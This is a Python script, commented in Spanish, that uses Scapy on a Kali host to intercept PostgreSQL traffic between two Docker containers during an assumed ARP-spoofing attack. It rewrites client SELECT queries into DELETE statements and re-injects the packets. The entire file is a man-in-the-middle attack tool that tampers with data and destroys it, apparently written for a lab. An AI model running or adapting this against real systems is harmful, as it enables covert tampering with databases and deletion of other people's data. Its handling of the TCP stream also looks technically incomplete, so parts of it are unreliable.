# modify_pgsql.py
# Este script intercepta el tráfico de PostgreSQL, modifica las consultas SELECT a DELETE,
# y reenvía los paquetes. Requiere que psql_utils.py esté en el mismo directorio.

from scapy.all import *
import sys
from psql_utils import craft_malicious_psql_query # Importamos la función necesaria

# --- CONFIGURA ESTAS VARIABLES ---
# IP del contenedor cliente pgcli
CLIENT_IP = "172.17.0.3" # Ejemplo: "172.17.0.3"
# IP del contenedor servidor PostgreSQL
SERVER_IP = "172.17.0.2"
# Interfaz de red de tu Kali Linux (probablemente "docker0")
INTERFACE = "docker0" # O la interfaz correcta que identificaste con 'ip a'

def modificar(pkt: Packet):
    """
    Función de callback para Scapy que procesa cada paquete capturado.
    Intenta modificar consultas SELECT a DELETE y reenvía los paquetes.
    """
    # Solo procesamos paquetes IP y TCP.
    if IP in pkt and TCP in pkt:
        # Verificamos que sea tráfico de PostgreSQL (puerto 5432)
        if pkt[TCP].dport == 5432 or pkt[TCP].sport == 5432:
            
            # --- Tráfico del Cliente al Servidor (posiblemente una consulta) ---
            if pkt[IP].src == CLIENT_IP and pkt[IP].dst == SERVER_IP and Raw in pkt:
                original_psql_payload = pkt[Raw].load

                # Los mensajes de consulta PSQL comienzan con 'Q'
                if original_psql_payload.startswith(b'Q'):
                    try:
                        # Extraer la longitud del mensaje PSQL (bytes 1 a 4)
                        message_length = int.from_bytes(original_psql_payload[1:5], 'big')
                        # Extraer la cadena SQL (después de los 5 bytes de cabecera y antes del terminador nulo)
                        # La longitud del mensaje incluye la cabecera, por lo que la SQL es el resto.
                        sql_string_bytes = original_psql_payload[5:message_length] # message_length incluye el null terminator

                        # Decodificar la SQL a string para procesar
                        original_sql = sql_string_bytes.decode('utf-8', errors='ignore').strip('\x00') # Eliminar el terminador nulo

                        if "SELECT" in original_sql.upper(): # Buscar "SELECT" sin importar mayúsculas/minúsculas
                            print(f"\n[+] INTERCEPTADO: Consulta PSQL de {CLIENT_IP} a {SERVER_IP}")
                            print(f"    Original SQL: {original_sql}")

                            # Usamos la función de psql_utils para reconstruir el mensaje PSQL
                            # con la SQL modificada y la longitud correcta.
                            # Aquí, reemplazamos 'SELECT' por 'DELETE' directamente en la SQL.
                            # Para una inyección SQL real, la lógica sería diferente (ej. inyectar ' OR 1=1 -- ').
                            modified_psql_payload = craft_malicious_psql_query(
                                original_sql=original_sql,
                                replacement_text="DELETE",
                                target_text="SELECT" # O "select", dependiendo de cómo quieras ser específico
                            )

                            # Crea un nuevo paquete con la carga útil PSQL maliciosa.
                            # Copia el paquete original y reemplaza la capa Raw.
                            new_pkt = pkt.copy()
                            new_pkt[TCP].remove_payload() # Elimina la antigua capa Raw
                            new_pkt[TCP].add_payload(Raw(load=modified_psql_payload)) # Añade la nueva carga útil

                            # Elimina los checksums y las longitudes para que Scapy los recalcule.
                            if IP in new_pkt:
                                del new_pkt[IP].len
                                del new_pkt[IP].chksum
                            if TCP in new_pkt:
                                del new_pkt[TCP].chksum

                            print(f"    MODIFICADO: Enviando consulta modificada a {SERVER_IP}")
                            print(f"    Nueva SQL: {modified_psql_payload.decode('utf-8', errors='ignore')[5:].strip('\x00')}") # Mostrar solo la SQL
                            sendp(new_pkt, iface=INTERFACE, verbose=0)
                            return # Paquete procesado, no reenviar el original.
                        else:
                            # Si no es una consulta SELECT, reenviar el paquete original sin modificar.
                            sendp(pkt, iface=INTERFACE, verbose=0)
                            return
                    except Exception as e:
                        print(f"[-] ERROR al procesar mensaje PSQL de {CLIENT_IP}: {e}. Reenviando original.")
                        sendp(pkt, iface=INTERFACE, verbose=0)
                        return
                else:
                    # Si no es un mensaje de consulta 'Q', reenviar sin modificar.
                    sendp(pkt, iface=INTERFACE, verbose=0)
                    return

            # --- Tráfico del Servidor al Cliente (respuestas) ---
            elif pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP:
                # Reenviar las respuestas del servidor sin modificar.
                sendp(pkt, iface=INTERFACE, verbose=0)
                return
    
    # --- Reenviar cualquier otro tipo de tráfico que no sea PSQL o no cumpla las condiciones ---
    sendp(pkt, iface=INTERFACE, verbose=0)


print("[*] Modificador de tráfico PSQL iniciado...")
print(f"[*] Escuchando tráfico entre Cliente ({CLIENT_IP}) y Servidor ({SERVER_IP}) en puerto 5432.")
print("[*] Asegúrate de que el reenvío IP esté habilitado y el ARP Spoofing esté activo en otras terminales.")
print("[*] Presiona Ctrl+C para detener el sniffing.")

try:
    # Inicia el sniffing de paquetes TCP en el puerto 5432
    # store=0 asegura que Scapy no almacene los paquetes en memoria, lo cual es eficiente para sniffing en vivo.
    sniff(filter=f"tcp port 5432 and (host {CLIENT_IP} or host {SERVER_IP})", prn=modificar, iface=INTERFACE, store=0)
except KeyboardInterrupt:
    print("\n[*] Deteniendo el script de modificación de tráfico.")
except Exception as e:
    print(f"[*] Ocurrió un error inesperado: {e}")
    sys.exit(1)

